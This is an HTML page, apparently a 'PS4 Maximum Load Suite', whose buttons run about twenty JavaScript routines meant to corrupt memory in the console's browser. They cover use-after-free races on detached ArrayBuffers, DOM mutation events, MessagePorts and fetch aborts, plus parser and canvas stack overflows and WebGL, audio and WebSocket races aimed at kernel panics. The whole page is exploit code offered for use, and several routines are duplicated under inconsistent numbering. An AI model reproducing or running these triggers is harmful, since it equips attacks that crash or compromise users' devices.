<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Maximum Load Suite (v5000)</title>

</head>
<body>

    <h2>SUITE V5000: MAXIMUM MEMORY CORRUPTION (12 VECTORS)</h2>
    <div id="console">Sistema pronto. 12 ogivas carregadas...</div>

    <div class="grid">
        <div class="category">
            <span class="cat-title">DOM LIFECYCLE & WORKERS (UAF)</span>
            <button onclick="runNodeRemovalUAF()">01. Node Removal Event Race</button>
            <button onclick="runWorkerTransferUAF()">02. Worker Transferable Detach</button>
            <button onclick="runEventListenerGC()">03. EventListener GC Premature Free</button>
            <button onclick="runMessagePortEntangle()">04. MessagePort Entanglement Crash</button>
            <button onclick="runTreeWalkerDetach()">05. TreeWalker Detached Root Access</button>
            <button onclick="runHTMLParserRecursion()">06. HTML Parser Nesting Overflow</button>
            <button onclick="runWorkerTransferRace()">01. Worker ArrayBuffer Transfer Race (UAF)</button>
<button onclick="runDOMNodeRemovedRace()">02. DOMNodeRemoved Event Handler Recursion</button>
<button onclick="runWebGLDeleteTextureRace()">03. WebGL Texture Delete/Draw Race (GPU Panic)</button>
<button onclick="runAudioContextCloseRace()">04. AudioContext Close/CreateSource Race</button>
<button onclick="runFetchBlobRevokeRace()">05. Fetch vs URL.revokeObjectURL Race (VFS Panic)</button>
<button onclick="runCanvasRecursiveClip()">06. Canvas2D Recursive Clip Stack Overflow</button>
<button onclick="runWebSocketDetachedSend()">07. WebSocket Send Detached Buffer (NetBSD Panic)</button>
<button onclick="runXHRReadyStateAbort()">08. XHR Abort during ReadyState Change</button>
<button onclick="runFontFaceSetIteratorInvalidation()">09. FontFaceSet Iterator Invalidation</button>
<button onclick="runMessageChannelRecursivePost()">10. MessageChannel Recursive Entanglement</button>
        </div>

        <div class="category">
            <span class="cat-title">KERNEL, GPU & NETWORK (PANIC)</span>
            <button onclick="runWebGLTextureRace()">07. WebGL Texture Upload/Delete Race</button>
            <button onclick="runAudioBufferNull()">08. AudioBufferSource Null Pointer</button>
            <button onclick="runSocketSendRace()">09. WebSocket Null Buffer Send</button>
            <button onclick="runCanvasDrawCrash()">10. Canvas 2D Path Winding Crash</button>
            <button onclick="runVFSRemoveRace()">11. VFS Blob URL Lookup/Revoke</button>
            <button onclick="runFetchAbortRace()">12. Fetch Abort Signal Use-After-Free</button>
        </div>
    </div>

    <script>
        function log(msg) {
            const el = document.getElementById('console');
            el.innerText += `\n> ${msg}`;
            el.scrollTop = el.scrollHeight;
        }

        // --- 01. Node Removal UAF ---
        function runNodeRemovalUAF() {
            log("01: DOM Node Removal Race...");
            const parent = document.createElement('div');
            const child = document.createElement('div');
            parent.appendChild(child);
            child.addEventListener('DOMNodeRemoved', () => {
                // Remove o pai durante a remoção do filho
                try { document.body.removeChild(parent); } catch(e){}
                // Tenta acessar propriedades do pai morto
                const x = parent.innerHTML; 
            });
            document.body.appendChild(parent);
            parent.removeChild(child);
        }

        // --- 02. Worker Transferable Detach ---
        function runWorkerTransferUAF() {
            log("02: Worker Transfer Race...");
            const ab = new ArrayBuffer(1024*1024);
            const view = new Int32Array(ab);
            const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
            setTimeout(() => w.postMessage(ab, [ab]), 0); // Detach async
            try {
                for(let i=0; i<10000; i++) view[0] = 0x41414141; // Write on free
            } catch(e){}
        }

        // --- 03. EventListener GC Premature Free ---
        function runEventListenerGC() {
            log("03: EventListener GC Race...");
            const btn = document.createElement('button');
            let handler = { handleEvent: () => {} };
            btn.addEventListener('click', handler);
            handler = null; // Remove ref forte
            // Força pressão de memória
            const trash = new Array(5000).fill(1).map(()=>new Uint8Array(1024));
            btn.click(); // Dispatch em objeto potencialmente coletado
        }

        // --- 04. MessagePort Entanglement Crash ---
        function runMessagePortEntangle() {
            log("04: MessagePort Entangle...");
            const ch = new MessageChannel();
            ch.port1.close();
            // Tenta enviar a porta fechada por ela mesma (ciclo inválido em C++)
            try { ch.port2.postMessage("", [ch.port1]); } catch(e){}
        }

        // --- 05. TreeWalker Detached Root Access ---
        function runTreeWalkerDetach() {
            log("05: TreeWalker Detach...");
            const root = document.createElement('div');
            const walker = document.createTreeWalker(root);
            // Destroi a raiz C++
            root.remove(); 
            // Tenta caminhar no vazio
            walker.nextNode(); 
        }

        // --- 06. HTML Parser Nesting Overflow ---
        function runHTMLParserRecursion() {
            log("06: HTML Parser Stack Overflow...");
            // Cria string HTML com aninhamento insano para estourar a stack do parser C++
            const html = "<div>".repeat(20000) + "</div>".repeat(20000);
            const div = document.createElement('div');
            div.innerHTML = html; // Trigger parser
        }

        // --- 07. WebGL Texture Upload/Delete Race ---
        function runWebGLTextureRace() {
            log("07: GPU Texture Race...");
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl');
            const tex = gl.createTexture();
            gl.bindTexture(gl.TEXTURE_2D, tex);
            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 10, 10, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
            // Delete e Draw no mesmo frame
            gl.clear(gl.COLOR_BUFFER_BIT);
            gl.deleteTexture(tex);
            gl.finish();
        }

        // --- 08. AudioBufferSource Null Pointer ---
        function runAudioBufferNull() {
            log("08: Audio Null Deref...");
            if(!window.AudioContext) return;
            const ctx = new AudioContext();
            const src = ctx.createBufferSource();
            // Inicia sem buffer (estado inválido) e conecta
            try {
                src.start();
                src.buffer = null; // Força nullificação durante start
                src.connect(ctx.destination);
            } catch(e){}
        }

        // --- 09. WebSocket Null Buffer Send ---
        function runSocketSendRace() {
            log("09: NetBSD Socket Panic...");
            const ws = new WebSocket("wss://echo.websocket.org");
            const ab = new ArrayBuffer(1024);
            ws.onopen = () => {
                const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                w.postMessage(ab, [ab]); // Detach
                try { ws.send(ab); } catch(e){} // Send NULL pointer
            };
        }

        // --- 10. Canvas 2D Path Winding Crash ---
        function runCanvasDrawCrash() {
            log("10: Canvas Winding Stack Overflow...");
            const c = document.createElement('canvas');
            const ctx = c.getContext('2d');
            ctx.beginPath();
            for(let i=0; i<10000; i++) ctx.rect(0,0,10,10); // Complexidade recursiva
            try { ctx.clip("evenodd"); ctx.fill(); } catch(e){}
        }

        // --- 11. VFS Blob URL Lookup/Revoke ---
        function runVFSRemoveRace() {
            log("11: VFS Blob Race...");
            const url = URL.createObjectURL(new Blob(["x"]));
            const w1 = new Worker(URL.createObjectURL(new Blob([`onmessage=u=>fetch(u)`],{type:'text/js'})));
            const w2 = new Worker(URL.createObjectURL(new Blob([`onmessage=u=>fetch(u)`],{type:'text/js'})));
            w1.postMessage(url);
            w2.postMessage(url);
            URL.revokeObjectURL(url); // Destroi o inode virtual sob carga
        }

        // --- 12. Fetch Abort Signal Use-After-Free ---
        function runFetchAbortRace() {
            log("12: Fetch Abort UAF...");
            const ac = new AbortController();
            const signal = ac.signal;
            fetch(location.href, {signal}).catch(e=>{});
            // Aborta e tenta forçar uso do sinal internamente
            ac.abort();
            // Cria pressão para limpar o objeto do sinal
            let a = []; for(let i=0;i<1000;i++) a.push({});
        }



function runWorkerTransferRace() {
    const ab = new ArrayBuffer(1024 * 1024 * 8);
    const view = new Int32Array(ab);
    const w = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
    setTimeout(() => w.postMessage(ab, [ab]), 0);
    for (let i = 0; i < 100000; i++) {
        view[0] = 0x41414141;
    }
}

function runDOMNodeRemovedRace() {
    const d1 = document.createElement('div');
    const d2 = document.createElement('div');
    d1.appendChild(d2);
    d2.addEventListener('DOMNodeRemoved', () => {
        try {
            document.body.removeChild(d1);
            d2.innerHTML = "A".repeat(1024);
        } catch (e) {}
    });
    document.body.appendChild(d1);
    d1.removeChild(d2);
}

function runWebGLDeleteTextureRace() {
    const gl = document.createElement('canvas').getContext('webgl');
    const tex = gl.createTexture();
    gl.bindTexture(gl.TEXTURE_2D, tex);
    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 64, 64, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
    const fb = gl.createFramebuffer();
    gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0);
    gl.clear(gl.COLOR_BUFFER_BIT);
    gl.deleteTexture(tex);
    gl.finish();
}

function runAudioContextCloseRace() {
    if (!window.AudioContext) return;
    const ctx = new AudioContext();
    const src = ctx.createOscillator();
    src.connect(ctx.destination);
    src.start();
    setTimeout(() => {
        ctx.close();
        try {
            src.stop();
            src.disconnect();
        } catch (e) {}
    }, 0);
}

function runFetchBlobRevokeRace() {
    const blob = new Blob([new ArrayBuffer(1024 * 1024)]);
    const url = URL.createObjectURL(blob);
    const w = new Worker(URL.createObjectURL(new Blob([`onmessage=u=>{for(let i=0;i<100;i++)fetch(u).catch(()=>{})}`], {type: 'text/javascript'})));
    w.postMessage(url);
    setTimeout(() => URL.revokeObjectURL(url), 1);
}

function runCanvasRecursiveClip() {
    const ctx = document.createElement('canvas').getContext('2d');
    ctx.beginPath();
    for (let i = 0; i < 5000; i++) ctx.rect(0, 0, 100, 100);
    ctx.clip("evenodd");
    ctx.fill();
}

function runWebSocketDetachedSend() {
    const ws = new WebSocket("wss://echo.websocket.org");
    const ab = new ArrayBuffer(1024);
    ws.onopen = () => {
        const w = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
        w.postMessage(ab, [ab]);
        ws.send(ab);
    };
}

function runXHRReadyStateAbort() {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', location.href);
    xhr.onreadystatechange = () => {
        if (xhr.readyState === 2) {
            xhr.abort();
            const s = xhr.status;
        }
    };
    xhr.send();
}

function runFontFaceSetIteratorInvalidation() {
    const font = new FontFace("X", "url(x)");
    const set = document.fonts;
    set.add(font);
    set.forEach((f, f2, s) => {
        s.clear();
        s.add(new FontFace("Y", "url(y)"));
    });
}

function runMessageChannelRecursivePost() {
    const ch = new MessageChannel();
    const p1 = ch.port1;
    const p2 = ch.port2;
    p1.onmessage = (e) => {
        p1.postMessage(e.data, [e.data]);
    };
    const ab = new ArrayBuffer(1);
    p2.postMessage(ab, [ab]);
}




        
    </script>
</body>
</html>

